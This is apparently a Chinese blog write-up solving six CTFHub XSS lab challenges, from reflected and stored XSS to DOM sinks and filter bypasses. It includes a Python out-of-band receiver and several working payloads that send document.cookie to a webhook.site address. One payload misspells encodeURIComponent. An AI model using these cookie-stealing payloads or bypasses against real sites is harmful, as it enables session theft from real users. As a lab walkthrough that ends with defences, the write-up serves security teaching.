---
title: "XSS 入门：CTFHub 实战 6 题"
date: "2026-11-16T00:06:49+08:00"
tags:
  - CTF
  - CTFHub
  - XSS
description: "按反射型、存储型、DOM 相关及过滤绕过等六道 CTFHub XSS 练习记录题目思路、关键请求和验证过程，帮助把漏洞原理落到实操。"
---

> 本文根据 CTFHub XSS 入门 6 道题的练习记录整理，包含反射型、存储型、DOM 反射、DOM 跳转、过滤空格、过滤关键词。靶场地址与 flag 为动态值，文中仅作示例；所有操作仅针对 CTFHub 提供的合法靶场环境。

# 一、准备：接收端与 Bot 机制

6 道题中有 4 道需要把受害者浏览器的 Cookie 发送到外部接收端。接收端可以是自建 HTTP 服务、内网穿透地址或 Webhook 平台。

接收端脚本 `oob_recv.py`：

```python
#!/usr/bin/env python3
"""带外接收端（OOB Receiver）

接收目标环境发来的 HTTP 请求并记录，用于盲打类漏洞的结果回传：
反射/存储型 XSS、SSRF、盲注、命令执行回连等。

启动：  python oob_recv.py --port 8000
日志：  默认 oob_hits.jsonl，每行一条 JSON
"""

import argparse
import json
import urllib.parse
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

MAX_BODY = 64 * 1024          # 只读前 64KB，防止超大请求撑爆内存


class Handler(BaseHTTPRequestHandler):
    server_version = "oob/1.0"

    # ---------- 记录一条请求 ----------
    def _record(self):
        # 1. 读请求体（GET 通常没有，POST 才有）
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(min(n, MAX_BODY)) if n else b""

        # 2. 拆 URL：path 里可能带 ?a=1&b=2
        parts = urllib.parse.urlsplit(self.path)
        query = urllib.parse.parse_qs(parts.query, keep_blank_values=True)

        rec = {
            "time":    datetime.now().isoformat(timespec="seconds"),
            "from":    self.client_address[0],      # 谁发来的
            "method":  self.command,
            "path":    self.path,                   # 原始形态，保留编码
            "route":   parts.path,
            "query":   query,                       # 已自动 URL 解码
            "body":    body.decode("utf-8", "replace"),
            "headers": dict(self.headers.items()),
        }

        # 3. 追加到日志文件（每行一条 JSON，方便事后 grep）
        with open(self.server.log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")

        # 4. 打到终端
        print(f"\n[{rec['time']}] {rec['method']} {rec['path']}  <- {rec['from']}")
        for k, vals in query.items():
            for v in vals:
                print(f"    {k} = {v}")
        if rec["body"]:
            print(f"    body = {rec['body'][:300]}")

    # ---------- 回一个空响应 ----------
    def _reply(self):
        self.send_response(204)
        self.end_headers()

    def do_GET(self):
        self._record()
        self._reply()

    def do_POST(self):
        self._record()
        self._reply()

    def do_HEAD(self):
        self._reply()

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

    def log_message(self, fmt, *args):
        pass          # 关掉 http.server 自带的 stderr 日志，避免刷屏


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0", help="监听地址")
    ap.add_argument("--port", type=int, default=8000, help="监听端口")
    ap.add_argument("--log",  default="oob_hits.jsonl", help="日志文件")
    args = ap.parse_args()

    srv = ThreadingHTTPServer((args.host, args.port), Handler)
    srv.log_path = args.log
    print(f"[*] listening on http://{args.host}:{args.port}")
    print(f"[*] log -> {args.log}")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] bye")


if __name__ == "__main__":
    main()
```

在 PowerShell 使用 winget 安装 cloudflared：

```powershell
winget install --id Cloudflare.cloudflared -e
```

开启监听：

```powershell
python.exe -u .\oob_recv.py --port 8000
cloudflared tunnel --url http://127.0.0.1:8000
```

CTFHub 的 XSS 题目页面通常包含两部分：

- 输入框：把 payload 写入页面或数据库；
- `Send URL to Bot`：把构造好的 URL 交给后台 Bot 访问。

Bot 访问页面时会携带目标站点的 Cookie；payload 执行后，把 `document.cookie` 发送到接收端。接收端日志中出现 `flag=ctfhub{...}` 即表示利用成功。

---

# 二、反射型

![二、反射型：reflect、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/01-reflect-task.png)

![二、反射型：reflect、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/02-reflect-page.png)

![二、反射型：reflect、测试](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/03-reflect-test.png)

![二、反射型：reflect、Bot、regex](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/04-reflect-bot-regex.png)

![二、反射型：reflect、Bot、code](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/05-reflect-bot-code.png)

**分析**：

- 页面把 `name` 参数输出到 `Hello, ...` 位置，参数在 URL 中可见。
- 输入普通字符串时，页面原样回显；输入 HTML 或 JavaScript 时，浏览器会按 HTML 解析。
- Bot 只接受匹配挑战域名的 URL。正则大致为 `^https?://challenge-[0-9a-f]{16}\.sandbox\.ctfhub\.com:10800`，因此不能直接提交接收端地址，必须提交挑战域名下的、带 payload 的 URL。
- Bot 的前端通过 `/submit` 接口提交 URL，后端 Bot 访问该 URL。

**Payload**：

```html
<script>
    new Image().src =
    "https://接收端或者XSS平台ip/?cookie=" +
    encodeURIComponment(document.cookie)
</script>
```

将 payload 放入 `name` 参数后，页面生成类似：

```text
http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/?name=<script>...</script>
```

把这个 URL 填入 `Send URL to Bot`，Bot 访问后执行脚本，浏览器向接收端发起请求。

![二、反射型：reflect、载荷](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/06-reflect-payload.png)

![二、反射型：reflect、send](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/07-reflect-send.png)

![二、反射型：reflect、receiver、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/08-reflect-receiver-flag.png)

也可以使用 Webhook 平台：

![二、反射型：reflect、webhook、url](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/09-reflect-webhook-url.png)

![二、反射型：reflect、webhook、载荷](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/10-reflect-webhook-payload.png)

![二、反射型：reflect、webhook、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/11-reflect-webhook-flag.png)

**知识点**：

- 反射型 XSS 的 payload 位于 URL 参数中，服务端把参数原样输出到 HTML；
- Bot 的 URL 白名单只校验域名，不校验参数内容；
- `new Image().src` 创建图片请求，把 Cookie 拼接到查询字符串；
- payload 中的编码函数对 Cookie 中的特殊字符编码，避免破坏 URL；
- 接收端只需要记录请求路径或查询参数，不需要返回内容。

---

# 三、存储型

![三、存储型：存储型、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/12-stored-task.png)

![三、存储型：存储型、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/13-stored-page.png)

![三、存储型：存储型、injected](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/14-stored-injected.png)

![三、存储型：存储型、incognito](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/15-stored-incognito.png)

**分析**：

- 页面与反射型类似，但提交后 URL 中不再出现 `?name=...`，说明输入被保存到服务端。
- 注入 `<b>hacking</b>` 后，普通 URL 打开页面仍显示 `Hello, hacking`；无痕窗口访问同样显示，说明数据持久化在数据库或文件中。
- payload 与反射型相同，但不再需要把 payload 放在 URL 中；Bot 访问正常页面即可触发。

**Payload**：

```html
<script>
    new Image().src = "https://webhook.site/872678c3-ffcf-457d-b503-8d28d63fa05d/?cookie=" +
    encodeURIComponent(document.cookie)
</script>
<b>hacking</b>
```

提交后，把正常页面 URL 填入 `Send URL to Bot`：

![三、存储型：存储型、webhook](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/16-stored-webhook.png)

![三、存储型：存储型、send](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/17-stored-send.png)

![三、存储型：存储型、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/18-stored-flag.png)

**知识点**：

- 存储型 XSS 的 payload 被持久化，所有访问该页面的用户都会触发；
- 无痕窗口验证可以排除浏览器缓存和本地 Cookie 的影响；
- Bot 访问正常 URL 即可，不需要在 URL 中携带 payload；
- 危害通常大于反射型，因为无需诱导受害者点击特制链接。

---

# 四、DOM 反射

![四、DOM 反射：domref、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/19-domref-task.png)

![四、DOM 反射：domref、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/20-domref-page.png)

![四、DOM 反射：domref、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/21-domref-source.png)

**分析**：

- 页面从 `text` 参数读取内容，通过 JavaScript 写入 `innerHTML`。
- 危险代码形式为：

```javascript
$("#text")[0].innerHTML = '参数值';
```

- 通过 `innerHTML` 插入的 `<script>` 标签不会执行，浏览器会把通过 `innerHTML` 插入的脚本标记为已执行。直接提交 `<script>alert(1)</script>` 不会弹窗。

![四、DOM 反射：domref、script、fail](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/22-domref-script-fail.png)

**Payload 一：截断字符串**

输入：

```javascript
';alert(1);'
```

拼接后的代码变为：

```javascript
$("#text")[0].innerHTML = '';alert(1);'';
```

前面的单引号和分号闭合了原字符串与赋值语句，`alert(1)` 作为独立语句执行；最后的单引号与模板剩余的引号、分号组成一个空字符串表达式，语法保持完整。

![四、DOM 反射：domref、breakout](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/23-domref-breakout.png)

![四、DOM 反射：domref、alert](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/24-domref-alert.png)

**Payload 二：事件处理器**

```html
<img src=x onerror=alert(1)>
```

`innerHTML` 会解析 HTML 标签，`<img>` 的 `onerror` 在图片加载失败时执行。

![四、DOM 反射：domref、onerror](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/25-domref-onerror.png)

**窃取 Cookie**：

```html
<img src=x onerror="new Image().src=`https://webhook.site/872678c3-ffcf-457d-b503-8d28d63fa05d/?cookie=${document.cookie}`">
```

把带 payload 的 URL 填入 `Send URL to Bot`：

![四、DOM 反射：domref、send](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/26-domref-send.png)

![四、DOM 反射：domref、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/27-domref-flag.png)

**知识点**：

- DOM 型 XSS 的 payload 可能不经过服务端，服务端日志看不到；
- `innerHTML` 是常见 sink，插入的 `<script>` 不执行，但事件处理器和部分标签可以执行；
- 截断字符串需要同时处理引号、分号和语句边界；
- 事件处理器比 `<script>` 更适合 `innerHTML` 场景。

---

# 五、DOM 跳转

![五、DOM 跳转：domjump、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/28-domjump-task.png)

![五、DOM 跳转：domjump、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/29-domjump-page.png)

![五、DOM 跳转：domjump、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/30-domjump-source.png)

**分析**：

- 页面从 `location.search` 读取参数，按 `=` 分割后取 `jumpto` 的值，赋值给 `location.href`。
- 危险代码形式为：

```javascript
var target = location.search.split("=");
if (target[0].slice(1) == "jumpto") {
    location.href = target[1];
}
```

- `location.href` 接受 `javascript:` 伪协议，赋值后会在当前页面执行 JavaScript。

**Payload**：

```text
http://challenge-dfdb409c3ba65cfc.sandbox.ctfhub.com:10800/?jumpto=javascript:fetch('https://webhook.site/872678c3-ffcf-457d-b503-8d28d63fa05d/'+encodeURIComponent(document.cookie))
```

![五、DOM 跳转：domjump、载荷](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/31-domjump-payload.png)

**注意**：

- 代码使用 `split("=")` 分割参数，payload 中不能出现多余的 `=`；
- `new Image().src=...` 包含 `=`，会被分割，导致 payload 被截断；
- `fetch(...)` 使用字符串拼接，不需要额外等号，适合该场景；
- 如果 payload 中的引号、括号被过滤，可以改用 `fetch` 的其他写法或对 URL 编码。

把构造好的 URL 填入 `Send URL to Bot`，Bot 访问后执行 `javascript:`，把 Cookie 发送到接收端：

![五、DOM 跳转：domjump、webhook](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/32-domjump-webhook.png)

![五、DOM 跳转：domjump、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/33-domjump-flag.png)

**知识点**：

- `location.href` 是 DOM 型 XSS 的 sink，`javascript:` 伪协议可以在当前页面执行代码；
- 参数分割逻辑会限制 payload 的字符集，需要避免 `=`；
- `fetch` 与 `new Image().src` 都可以发起请求，但 `new Image().src` 需要赋值等号；
- DOM 跳转类漏洞的触发点在浏览器，服务端可能只返回静态页面。

---

# 六、过滤空格

![六、过滤空格：space、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/34-space-task.png)

![六、过滤空格：space、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/35-space-page.png)

**分析**：

- 页面仍然把 `name` 参数输出到 HTML，但服务端过滤了空格字符。
- 过滤空格不影响标签和 JavaScript 语法：只要 payload 中不出现空格，`<script>` 仍然可以执行。
- 可以使用 `fetch` 配合字符串拼接，避免在 `new Image().src` 中引入空格。

**Payload**：

```html
<script>fetch("https://webhook.site/872678c3-ffcf-457d-b503-8d28d63fa05d/?cookie="+encodeURIComponent(document.cookie))</script>
```

提交后，把生成的 URL 填入 `Send URL to Bot`：

![六、过滤空格：space、载荷](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/36-space-payload.png)

![六、过滤空格：space、webhook](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/37-space-webhook.png)

接收端收到的 Cookie 可能经过 URL 编码，需要解码：

![六、过滤空格：space、decode](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/38-space-decode.png)

**知识点**：

- 空格过滤只影响包含空格的语法，不影响紧凑写法；
- `<script>fetch(...)</script>` 可以完全不含空格；
- `+` 在 URL 中会被解码为空格，构造 URL 时要注意；
- 接收端日志中的 `%3D`、`%7B`、`%7D` 分别是 `=`、`{`、`}` 的 URL 编码。

---

# 七、过滤关键词

![七、过滤关键词：keyword、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/39-keyword-task.png)

![七、过滤关键词：keyword、页面](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/40-keyword-page.png)

**分析**：

- 服务端过滤了 `script`、`img` 等关键字。
- 关键字黑名单不能覆盖所有可以执行脚本的 HTML 标签和事件。
- `<svg onload=...>` 可以在 SVG 加载完成时执行事件处理器，且不包含 `script`、`img`。

**Payload**：

```html
<svg onload=fetch("https://webhook.site/872678c3-ffcf-457d-b503-8d28d63fa05d/?cookie="+encodeURIComponent(document.cookie))>
```

提交后，把生成的 URL 填入 `Send URL to Bot`：

![七、过滤关键词：keyword、载荷](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/41-keyword-payload.png)

![七、过滤关键词：keyword、webhook](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/42-keyword-webhook.png)

接收端收到编码后的 Cookie，解码：

![七、过滤关键词：keyword、decode](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/xss/43-keyword-decode.png)

**知识点**：

- 关键字黑名单只覆盖部分标签时，可以通过其他标签和事件绕过；
- `svg` 的 `onload`、`body` 的 `onload`、`details` 的 `ontoggle` 等都可以作为触发点；
- 过滤关键字不如输出编码可靠，因为 HTML 标签和事件数量很多；
- 接收端解码后可以看到完整的 `flag=ctfhub{...}`。

---

# 八、6 题知识点对照

| # | 题目 | 类型 | 关键点 |
| --- | --- | --- | --- |
| 1 | 反射型 | 反射型 XSS | URL 参数回显；Bot 访问带 payload 的 URL |
| 2 | 存储型 | 存储型 XSS | payload 入库；Bot 访问正常页面 |
| 3 | DOM 反射 | DOM 型 XSS | `innerHTML` sink；`<script>` 不执行；事件处理器或字符串截断 |
| 4 | DOM 跳转 | DOM 型 XSS | `location.href` sink；`javascript:` 伪协议；避免 `=` |
| 5 | 过滤空格 | 反射型 XSS + 黑名单 | 无空格 payload；`fetch` 拼接 |
| 6 | 过滤关键词 | 反射型 XSS + 黑名单 | `<svg onload>` 替代 `script`/`img` |

---

# 九、总结

6 道题覆盖了 XSS 的三种类型和两类过滤：

1. **反射型**：payload 在 URL 参数中，服务端原样回显，Bot 访问特制 URL 触发；
2. **存储型**：payload 被持久化，Bot 访问正常页面即可触发，危害更大；
3. **DOM 型**：`innerHTML`、`location.href` 等 sink 在浏览器端执行，服务端可能看不到 payload；
4. **黑名单绕过**：空格过滤使用紧凑写法，关键字过滤使用其他标签与事件；
5. **数据回传**：`new Image().src`、`fetch` 把 Cookie 发送到接收端，接收端解码后获取 flag；
6. **防御**：按上下文输出编码、会话 Cookie 设置 HttpOnly、部署 CSP、对输入做白名单校验。

XSS 的利用前提是**不可信数据进入 HTML 或 JavaScript 上下文**。测试时应先确认输出位置和上下文，再选择标签、事件或伪协议；不要只依赖一个固定的 `<script>alert(1)</script>`。
